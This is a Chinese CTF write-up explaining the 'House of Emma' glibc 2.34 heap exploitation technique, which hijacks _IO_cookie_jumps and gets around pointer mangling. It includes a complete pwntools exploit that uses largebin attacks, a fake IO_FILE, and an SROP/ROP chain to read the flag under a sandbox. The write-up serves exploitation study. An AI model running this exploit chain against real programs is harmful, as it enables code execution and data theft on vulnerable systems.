0x01 概述
=======

本文大部分都是基于wjh师傅的研究做的解释，原文地址如下：<https://blog.wjhwjhn.com/archives/751/>

libc2.34新版本在2021出现，这次的改动是，减去了hook，导致不能和之前一样劫持hook打orw或者getshell了。

于是需要新的利用方法，或者说，需要新的类似Free\_hook或者Malloc\_hook的东西来替代之前的方法。

在湖湘杯的比赛中碰到了这道1解题。

以往的漏洞利用，大都借助hook作为一个跳板实现了任意地址写向任意代码执行的转变，然而在新版本中取消了hook的机制，所以我们需要利用一个类似hook的东西，来实现劫持向getshell的转变。

实际上，我们很好想到IO中的虚表，vtable的机制和hook实际上是比较类似的，作为函数跳板去执行真实的函数，而其自生的检查比较少，条件实际上是比hook弱一点的。

但是由于其利用过程较为繁琐，主要突出在底层的虚表函数调用实际上对用户是比较透明的，所以IO的利用相比起其余的方法来说，扩展的比较慢。

但是在Emma中实现了IO利用的一大步。

要说原理其实和Kiwi Fsop差不多，关键点在于新的IO链的发掘。

0x02 利用
=======

适用于当下所有的libc版本。

- 任意写一个可控地址（largebin attack stash等）
- 可以触发IO流（FSOP，House of kiwi)

Vtable
------

在 vtable 的合法范围内，存在一个 \_IO\_cookie\_jumps

```c
//jump表里的函数，可以看到cookie的函数
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
      JUMP_INIT_DUMMY,
      JUMP_INIT(finish, _IO_file_finish),
      JUMP_INIT(overflow, _IO_file_overflow),
      JUMP_INIT(underflow, _IO_file_underflow),
      JUMP_INIT(uflow, _IO_default_uflow),
      JUMP_INIT(pbackfail, _IO_default_pbackfail),
      JUMP_INIT(xsputn, _IO_file_xsputn),
      JUMP_INIT(xsgetn, _IO_default_xsgetn),
      JUMP_INIT(seekoff, _IO_cookie_seekoff),
      JUMP_INIT(seekpos, _IO_default_seekpos),
      JUMP_INIT(setbuf, _IO_file_setbuf),
      JUMP_INIT(sync, _IO_file_sync),
      JUMP_INIT(doallocate, _IO_file_doallocate),
      JUMP_INIT(read, _IO_cookie_read),
      JUMP_INIT(write, _IO_cookie_write),
      JUMP_INIT(seek, _IO_cookie_seek),
      JUMP_INIT(close, _IO_cookie_close),
      JUMP_INIT(stat, _IO_default_stat),
      JUMP_INIT(showmanyc, _IO_default_showmanyc),
      JUMP_INIT(imbue, _IO_default_imbue),
    };
```

虚表，存在的是函数指针，通过偏移可以劫持其中的任意函数。在IO\_cookie\_jumps中存在几个函数，比较特殊。

```c
static ssize_t
    _IO_cookie_read (FILE *fp, void *buf, ssize_t size)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_read_function_t *read_cb = cfile->__io_functions.read;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (read_cb);
    #endif

      if (read_cb == NULL)
        return -1;

      return read_cb (cfile->__cookie, buf, size);
    }

    static ssize_t
    _IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_write_function_t *write_cb = cfile->__io_functions.write;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (write_cb);
    #endif

      if (write_cb == NULL)
        {
          fp->_flags |= _IO_ERR_SEEN;
          return 0;
        }

      ssize_t n = write_cb (cfile->__cookie, buf, size);
      if (n < size)
        fp->_flags |= _IO_ERR_SEEN;

      return n;
    }

    static off64_t
    _IO_cookie_seek (FILE *fp, off64_t offset, int dir)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (seek_cb);
    #endif

      return ((seek_cb == NULL
           || (seek_cb (cfile->__cookie, &offset, dir)
               == -1)
           || offset == (off64_t) -1)
          ? _IO_pos_BAD : offset);
    }

    static int
    _IO_cookie_close (FILE *fp)
    {
      struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
      cookie_close_function_t *close_cb = cfile->__io_functions.close;
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (close_cb);
    #endif

      if (close_cb == NULL)
        return 0;

      return close_cb (cfile->__cookie);
    }
```

以上三个函数不难发现，都是先做一个类型的强制转化，然后给参数1赋新值。

详细观察强制类型转化之后的结构体，是一个\_IO\_FILE\_plus的扩展。

```c
/* Special file type for fopencookie function.  */
    struct _IO_cookie_file
    {
      struct _IO_FILE_plus __fp;
      void *__cookie;
      cookie_io_functions_t __io_functions; //方法
    };

    typedef struct _IO_cookie_io_functions_t
    {
      cookie_read_function_t *read;        /* Read bytes.  */
      cookie_write_function_t *write;    /* Write bytes.  */
      cookie_seek_function_t *seek;        /* Seek/tell file position.  */
      cookie_close_function_t *close;    /* Close file.  */
    } cookie_io_functions_t;
```

扩展后面添加了\_cookie指针，和IO\_function方法。方法用的是结构题本身而不是指针。

再回去看到盯上的三个函数，以Write函数为例子。最后的函数调用。

```c
write_cb (cfile->__cookie, buf, size);
```

由以上易知，如果可以控制IO\_FILE\_plus结构体，那么一定可以做到伪造一个\_IO\_cookie\_file结构体实现任意函数调用。

控制IO\_FILE\_plus的方法很多，往IO\_list\_all或者\_stderr这些地方写堆地址即可。于是便有了以下的利用链。

基本方法是伪造vtable表。

调用链
---

触发IO流之后，会有一个call rbx+0x38的指令被触发，这时候rbx刚好是jump表。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-15931f92b4949e505f1fc66bb0f2f7cac9d2cc86.png)

此时这里打入IO\_cookie\_write的地址（也可以是以上函数的任意一个）就能实现劫持。

在IO\_FILE\_plus中我们构造的是关于\_IO\_cookie的扩展版本。

```c
struct _IO_cookie_file
{
  struct _IO_FILE_plus __fp;
  void *__cookie;
  cookie_io_functions_t __io_functions;
};

typedef struct _IO_cookie_io_functions_t
{
  cookie_read_function_t *read;        /* Read bytes.  */
  cookie_write_function_t *write;    /* Write bytes.  */
  cookie_seek_function_t *seek;        /* Seek/tell file position.  */
  cookie_close_function_t *close;    /* Close file.  */
} cookie_io_functions_t;
```

vatble的下面可以继续伪造参数和函数。因为，看到write的原型中调用的就是\_\_cookie指针和io\_function。0xF0偏移处的函数且参数为0xE0处的指针。

如果往这个地址打入gadget就实现了Orw或者直接onegadget的利用。

绕过PTR\_DEMANGLE
---------------

以上的分析中，没有考虑到glibc中的指针保护机制，`PTR_DEMANGLE` ，该选项在Glibc中是默认开启的

所以我们劫持的时候要考虑到该指针的加密检查问题

```c
extern uintptr_t __pointer_chk_guard attribute_relro;
    #  define PTR_MANGLE(var) \\
      (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)
    #  define PTR_DEMANGLE(var) PTR_MANGLE (var)
```

从源码中观察，似乎是一个异或加密。

阅读WJH师傅的博客发现，这个值（保护指针的内容）存在于 TLS 段上，将其 ROR 移位 0x11 后再与指针进行异或。

[GLibc TLS实现](https://www.cnblogs.com/cobbliu/articles/8018982.html)

关于TLS的资料在上面。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-184e1521ea7be90e220aa3cdddfb70c82c4c8f73.png)

该值存在于fs:0x30的位置，这个位置和ld贴的很近，相对libc基址的偏移固定，虽然我们无法精准的泄露该值，但是可以往里面写一个固定的地址。

- Stash
- Fastbin reverse into Tcache
- largebin attack

无论哪一种，只要实现了往该地址写入一个已知的值，让这个本不随机的异或的加密值，变成已知的。

一些问题
----

> 在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。

所以考虑构造两个IO\_FILE，二者处于chains的相邻段，即第一个的chains指向第二个IO\_FILE。

这样第一个用来修改\_\_pointer\_chk\_guard，绕过检查，第二个用来打House of Emma的利用链。

0x03 House of Emma题解
====================

基本情况
----

保护全开

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4ae1ad36da4c1c51f0db5974b188900cfadad2a2.png)

开了沙箱，ban掉了execve。

保护全开。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b9e744052d633da5691af1e31cd87080eec2d5ab.png)

看main函数，应该是一个VM类型的题。

读入一个指令，然后jumpout损坏。。。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-045baec5e5d5e30488a1797cd25d8a93bc43852a.png)

add函数，限制大小在0x40F和0x500之间。16个chunk

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d46b55e717f5d65c715a4d6b33757a713afad1ce.png)

明显的UAF

show函数就是简单的泄露

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c64b2a23e4ecbc3a50f5994cc635a93ff17f079.png)

大概分析出这个简单的VM了，

输入的第一个字节做switch跳转，第二个字节是index第三第四个字节是size，以后是edit函数的输入。

尝试修复JUMPOUT
-----------

动调发现函数入口（其实在IDA一眼就能看到。。。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c3681d49a8dfe4c82f64e9ee37732e71ad8dc6dc.png)

然后再函数入口处按了一下P，神奇的发现，函数的开始地址被重新定义了！！！

然后再去main函数那里，把call patch掉，yep，修改成功。然而又遇到了jmp rax

```c
void __fastcall sub_128D(_BYTE *a1)
{
  while ( (*a1 & 0xFu) > 0x10 )
    puts("Invalid opcode");
  __asm { jmp     rax }
}
```

看汇编的意思是如下

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-22c59e409d9255a92bab58c8a822a1718c151ebf.png)

从地址取偏移然后jmp，看到偏移表，我们按照4字节区分开来

```c
.rodata:000000000000203C dword_203C      dd 0FFFFF44Ch           ; DATA XREF: sub_128D+34↑o
.rodata:000000000000203C                                         ; sub_128D+40↑o
.rodata:0000000000002040                 dd 0FFFFF3A1h
.rodata:0000000000002044                 dd 0FFFFF3C8h
.rodata:0000000000002048                 dd 0FFFFF3ECh
.rodata:000000000000204C                 dd 0FFFFF410h
.rodata:0000000000002050                 dd 0FFFFF445h
.rodata:0000000000002054                 dd 0FFFFF29Eh
.rodata:0000000000002058                 dd 0FFFFF2D1h
.rodata:000000000000205C                 dd 0FFFFF36Fh
.rodata:0000000000002060                 dd 0FFFFF306h
.rodata:0000000000002064                 dd 0FFFFF44Ch
.rodata:0000000000002068                 dd 0FFFFF44Ch
.rodata:000000000000206C                 dd 0FFFFF44Ch
.rodata:0000000000002070                 dd 0FFFFF44Ch
.rodata:0000000000002074                 dd 0FFFFF44Ch
.rodata:0000000000002078                 dd 0FFFFF44Ch
.rodata:000000000000207C                 dd 0FFFFF33Ah
```

类似switch的结构中出现的表。

假设选择的是我们计算一下 rdx+该偏移表的地址，发现刚好落在后面的一些段内，于是可以分析

```c
opcode取值
- 0 违法
- 1 add
- 2 del
- 3 show
- 4 edit
- 5 结束
- 6 似乎是实现一个循环解析指令的效果
还有一些杂的就不逐一分析了
```

所以说一次以4字节为一个指令，可以连续执行。

每次5退出之后，重新malloc一个chunk再次输入指令。

关于修复JUMPOUT [分享一个对抗JUMPOUT的小技巧\_游戏逆向](http://www.yxfzedu.com/rs_show/150)

关于修复jmp rax 看上面。。。

解题思路
----

泄露lilbc还是很简单的，直接ub一把梭。

然后就有点蒙了，largebin下的攻击getshell的还真不多，能想起来的也只有任意地址写堆地址，利用FSOP打伪造IO来实现getshell。

但是这题开了沙箱保护，属实又把难度提高了很多。

下面主要分析一下该题解的exp

- - - - - -

思路

1. 使用 LargeBin Attack劫持stderr实现IO\_FILE\_plus的劫持
2. 使用 LargeBin Attack 在\_\_pointer\_chk\_guard 处写一个已知地址
3. 往相应的堆中写入伪造的扩展之后的结构体
4. 利用 Unsorted Bin 会与 Top Chunk 合并的机制来修改 Top Chunk 的 Size，从而触发[House OF Kiwi](https://www.anquanke.com/post/id/235598) 中的 IO 调用。
5. 进入 House OF Emma 的调用链，同时寻找一个能够转移 rdi 到 rdx 的 gadget，利用这个 gadget 来为 Setcontext 提供内容。
6. 利用 Setcontext 来执行 ROP 来 ORW

（Wjh师傅）官方exp

```python
from pwn import *

    context.log_level = "debug"
    context.arch = "amd64"
    # sh = process('./pwn')
    sh = remote('127.0.0.1', 9999)
    libc = ELF('./lib/libc.so.6')
    all_payload = ""

    def ROL(content, key):
        tmp = bin(content)[2:].rjust(64, '0')
        return int(tmp[key:] + tmp[:key], 2)

    def add(idx, size):
        global all_payload
        payload = p8(0x1)
        payload += p8(idx)
        payload += p16(size)
        all_payload += payload

    def show(idx):
        global all_payload
        payload = p8(0x3)
        payload += p8(idx)
        all_payload += payload

    def delete(idx):
        global all_payload
        payload = p8(0x2)
        payload += p8(idx)
        all_payload += payload

    def edit(idx, buf):
        global all_payload
        payload = p8(0x4)
        payload += p8(idx)
        payload += p16(len(buf))
        payload += str(buf)
        all_payload += payload

    def run_opcode():
        global all_payload
        all_payload += p8(5)
        sh.sendafter("Pls input the opcode", all_payload)
        all_payload = ""

    # leak libc_base
    add(0, 0x410)
    add(1, 0x410)
    add(2, 0x420)
    add(3, 0x410)
    delete(2)
    add(4, 0x430)
    show(2)
    run_opcode()

    libc_base = u64(sh.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x1f30b0  # main_arena + 1104
    log.success("libc_base:\\t" + hex(libc_base))
    libc.address = libc_base

    guard = libc_base + 0x2035f0
    pop_rdi_addr = libc_base + 0x2daa2
    pop_rsi_addr = libc_base + 0x37c0a
    pop_rax_addr = libc_base + 0x446c0
    syscall_addr = libc_base + 0x883b6
    gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    setcontext_addr = libc_base + 0x50bc0

    # leak heapbase
    edit(2, "a" * 0x10)
    show(2)
    run_opcode()
    sh.recvuntil("a" * 0x10)
    heap_base = u64(sh.recv(6).ljust(8, '\\x00')) - 0x2ae0
    log.success("heap_base:\\t" + hex(heap_base))

    # largebin attack stderr
    delete(0)
    edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(libc.sym['stderr'] - 0x20))
    add(5, 0x430)
    edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
    edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
    add(0, 0x410)
    add(2, 0x420)
    run_opcode()

    # largebin attack guard
    delete(2)
    add(6, 0x430)
    delete(0)
    edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))
    add(7, 0x450)
    edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
    edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
    add(2, 0x420)
    add(0, 0x410)

    # change top chunk size
    delete(7)
    add(8, 0x430)
    edit(7, 'a' * 0x438 + p64(0x300))
    run_opcode()

    next_chain = 0
    srop_addr = heap_base + 0x2ae0 + 0x10
    fake_IO_FILE = 2 * p64(0)
    fake_IO_FILE += p64(0)  # _IO_write_base = 0
    fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
    fake_IO_FILE += p64(0)
    fake_IO_FILE += p64(0)  # _IO_buf_base
    fake_IO_FILE += p64(0)  # _IO_buf_end
    fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\\x00')
    fake_IO_FILE += p64(next_chain)  # _chain
    fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\\x00')
    fake_IO_FILE += p64(heap_base)  # _lock = writable address
    fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\\x00')
    fake_IO_FILE += p64(0)  # _mode = 0
    fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\\x00')
    fake_IO_FILE += p64(libc.sym['_IO_cookie_jumps'] + 0x40)  # vtable
    fake_IO_FILE += p64(srop_addr)  # rdi
    fake_IO_FILE += p64(0)
    fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))

    fake_frame_addr = srop_addr
    frame = SigreturnFrame()
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsi = 0
    frame.rdx = 0x100
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret

    rop_data = [
        pop_rax_addr,  # sys_open('flag', 0)
        2,
        syscall_addr,

        pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
        0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr,

        pop_rax_addr,  # sys_write(1, heap, 0x100)
        1,
        pop_rdi_addr,
        1,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr
    ]
    payload = p64(0) + p64(fake_frame_addr) + '\\x00' * 0x10 + p64(setcontext_addr + 61)
    payload += str(frame).ljust(0xF8, '\\x00')[0x28:] + 'flag'.ljust(0x10, '\\x00') + flat(rop_data)

    edit(0, fake_IO_FILE)
    edit(2, payload)

    add(8, 0x450)  # House OF Kiwi
    # gdb.attach(sh, "b _IO_cookie_write")
    run_opcode()
    sh.interactive()
```

泄露libc和heap基址
-------------

```python
# leak libc_base
add(0, 0x410)
add(1, 0x410)
add(2, 0x420)
add(3, 0x410)
delete(2)
add(4, 0x430)
show(2)
run_opcode()

libc_base = u64(sh.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x1f30b0  # main_arena + 1104
log.success("libc_base:\\t" + hex(libc_base))
libc.address = libc_base

guard = libc_base + 0x2035f0
pop_rdi_addr = libc_base + 0x2daa2
pop_rsi_addr = libc_base + 0x37c0a
pop_rax_addr = libc_base + 0x446c0
syscall_addr = libc_base + 0x883b6
gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
setcontext_addr = libc_base + 0x50bc0

# leak heapbase
edit(2, "a" * 0x10)
show(2)
run_opcode()
sh.recvuntil("a" * 0x10)
heap_base = u64(sh.recv(6).ljust(8, '\\x00')) - 0x2ae0
log.success("heap_base:\\t" + hex(heap_base))
```

其中的一些地址，syscall和guard的取值偏移不是特别了解。这里不是重点，先继续看下面的内容

- 关于泄露，libc基址没得说，heap的话在largebin只有一个chunk的时候其fd\_nextsize和bk\_nextsize指向自己。

largebin attack打地址到stderr
-------------------------

该操作顺便修复了edit的chunk2

打一个地址（stderr-0x20)到bk指针，实现largebin attack(calloc触发）

然后再次修复largebin的结构然后malloc出来，**一切恢复如初，准备下一步的利用。（此时stderr已经被劫持为堆上的地址了）**

后面的写任意地址一样的操作。不做多解释

这里可以借鉴以下，在UAF存在的条件下，这里free(7)(一个大chunk) 然后使其和topchunk合并，然后add(8)(一个小的chunk),在之后edit 7就可以越界写topchunk的size了

Emma中的IO调用
----------

实际上就是一个上面的IO链+orw

调用的时候通过偏移调用到了我们指定的write函数上，然后就执行了gadget。

### 调试

实际上跟踪IO流是最好的方法，这里选择了在IO\_cookie\_write下一个断点，因为是需要利用的漏洞函数。

断下来之后，首先停在了入口处。这里首先让我们过不去。为了展示一下payload，实际上可以一遍过。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9fac5e0f783dc5afa5d097883836bbcf6c14a96d.png)

这里就是ror对TLS段指针的保护。

然后继续走，发现运行到了内核函数，一直运行到第一个call调用

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-43b88d53d3d65496c9b4952194d95026fa6e86be.png)

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c4a2b195d36b9312f4f25bc83e98147ab9a77777.png)

这也就解释了为何需要设置新的vtable为+0x40偏移的位置，只是为了把write的地址对的上这里的call函数。

这里的调用选择的参数可以看看，Cfile-&gt;cookie，这里对应的是rdi的0xe0处的偏移。也即是0x0000558367576af0

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1aade52472857f2b92b1e0ed939ca9871d720b87.png)

可以看到其中的payload。调用的函数时原来写的gadget

跟进write函数看一看。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1a8ee7e24e14f75dcdb935e605e90d69d738e8b3.png)

第一次调用的时候，我们设置了rax不为0，但实际上需要为0才可以调用，call rax，这里的rax时输入的ror之后的gadget地址，所以这里ror之后实际上已经回来了。这里没有刻意打远程的TLS，所以设置一下。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8728df21ada328af58c11c6a78f70a9d742e124e.png)  
接下来call rax的时候会执行这里，参数是我们的payload，看一下

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8dd85ef1920924075b4f3c27b4f10ea9ca3f3ca6.png)

完全没问题。

接下来就是正常的orw。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5e0a9c13a9aad3eb2d6fff23d09a245896f9a6a4.png)

0x04 总结
=======

使用的其实不是house of kiwi的链子，只是用该手段触发IO罢了。最终还是处理路上的IO\_cookie\_write触发字节，才实现了orw的调用。

最近比赛中遇到的2.34 2.31的题越来越多，方法也是层出不穷，对高版本的libc利用找到了第一次出现2.34的位置，学习了一下。IO可真是什么都能打。读一下IO源码还是有好处的。